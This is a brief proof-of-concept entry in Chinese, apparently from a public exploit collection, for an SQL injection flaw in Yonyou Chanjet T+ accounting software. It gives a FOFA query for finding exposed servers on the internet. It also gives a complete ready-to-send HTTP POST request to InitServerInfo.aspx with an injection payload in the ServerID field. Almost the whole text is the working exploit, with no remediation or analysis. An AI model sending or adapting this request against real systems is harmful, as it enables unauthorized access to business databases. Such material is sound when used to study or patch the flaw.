## 用友畅捷通TPlus-InitServerInfo存在SQL注入漏洞

## fofa
```
app="畅捷通-TPlus"
```

## poc
```
POST /tplus/UFAQD/InitServerInfo.aspx?preload=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 113

operbtn=create&ServerID=1'%2b(select 1 where 1 in (SELECT sys.fn_varbintohexstr(hashbytes('MD5','123456'))))%2b'1
```
![c2758ffb9af884d3e9246f48e1c4191a](https://github.com/wy876/POC/assets/139549762/520a3274-ce88-43b9-89a7-fc20505017bb)
